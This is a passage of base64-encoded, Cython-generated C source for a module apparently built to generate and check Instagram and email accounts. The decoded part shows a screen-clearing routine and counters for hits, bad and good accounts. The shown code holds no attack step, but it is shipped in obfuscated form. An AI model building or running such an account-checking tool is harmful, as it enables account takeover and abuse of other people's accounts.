wMDApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDEpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI1MDAwMDAwMDApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNTY5OTc4NTIxNyk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50Xzg1MDc5NDA2MzQpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCk7XG4gIHJldHVybiAwO1xufVxuI2VuZGlmXG5cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yb3BfMXBwcHAoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCk7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm9wXzFwcHBwID0geyJwcHBwIiwgKFB5Q0Z1bmN0aW9uKV9fcHl4X3B3XzJvcF8xcHBwcCwgTUVUSF9OT0FSR1MsIDB9O1xuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yb3BfMXBwcHAoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCkge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInBwcHAgKHdyYXBwZXIpIiwgMCk7XG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8yb3BfcHBwcChfX3B5eF9zZWxmKTtcblxuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJvcF9wcHBwKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfYiA9IE5VTEw7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfYm8gPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9vdXRwdXQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfM1szXTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7XG4gIGludCBfX3B5eF90Xzg7XG4gIHNpemVfdCBfX3B5eF90Xzk7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwWzldO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJwcHBwIiwgMCk7XG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgOTUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgOTUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF92X2IgPSBfX3B5eF90XzE7XG4gIF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X2IsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA5NiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzNbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzU7XG4gIF9fcHl4X3RfM1sxXSA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8zWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X207XG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMywgMywgNyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMSkgKyAxLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xKSk7XG4gIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF92X2JvID0gKChQeU9iamVjdCopX19weXhfdF8yKTtcbiAgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDk3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgOTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA5NywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5NywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgX19weXhfdF84ID0gKF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbnQsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF84IDwgMCkpKSBfX1BZWF9FUlIoMCwgOTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgaWYgKF9fcHl4X3RfOCkge1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xzKTtcbiAgICBfX3B5eF90XzQgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xzO1xuICB9IGVsc2Uge1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xlYXIpO1xuICAgIF9fcHl4X3RfNCA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGVhcjtcbiAgfVxuICBfX3B5eF90XzkgPSAxO1xuICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgIF9fcHl4X3RfMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNSk7XG4gICAgYXNzZXJ0KF9fcHl4X3RfMSk7XG4gICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fcHl4X3RfOSA9IDA7XG4gIH1cbiAgI2VuZGlmXG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF90XzR9O1xuICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgOTcsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA5OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgOTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMDAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwMCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRlbWFpbCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDEwMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RpZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDEwMiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF90XzEwWzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9UcnVlO1xuICBfX3B5eF90XzEwWzFdID0gX19weXhfdF81O1xuICBfX3B5eF90XzEwWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9HZW47XG4gIF9fcHl4X3RfMTBbM10gPSBfX3B5eF90XzQ7XG4gIF9fcHl4X3RfMTBbNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0JhZDtcbiAgX19weXhfdF8xMFs1XSA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8xMFs2XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTm90O1xuICBfX3B5eF90XzEwWzddID0gX19weXhfdF83O1xuICBfX3B5eF90XzEwWzhdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV87XG5cbiAgXG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTAsIDksIDE3ICogNCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNykgKyAzLCA2NTUzNSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzUpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzcpKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgOTgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gIF9fcHl4X3Zfb3V0cHV0ID0gKChQeU9iamVjdCopX19weXhfdF8yKTtcbiAgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMDQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGRvdXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMDQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3RfNyA9IF9fcHl4X3RfNDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gIF9fcHl4X3RfOSA9IDA7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF83LCBfX3B5eF92X291dHB1dH07XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dyaXRlLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTA0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGRvdXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gIF9fcHl4X3RfNCA9IF9fcHl4X3RfMTtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfOSA9IDA7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBOVUxMfTtcbiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmx1c2gsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygib3AucHBwcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9ibyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9vdXRwdXQpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJvcF8zdGxsKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJvcF8zdGxsID0geyJ0bGwiLCAoUHlDRnVuY3Rpb24pX19weXhfcHdfMm9wXzN0bGwsIE1FVEhfTk9BUkdTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm9wXzN0bGwoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCkge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInRsbCAod3JhcHBlcikiLCAwKTtcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJvcF8ydGxsKF9fcHl4X3NlbGYpO1xuXG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJvcF8zdGxsXzJnZW5lcmF0b3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSk7IFxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yb3BfM3RsbF9nZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTtcbiAgX19weXhfY3VyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKV9fcHl4X3RwX25ld18yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBOVUxMKTtcbiAgaWYgKHVubGlrZWx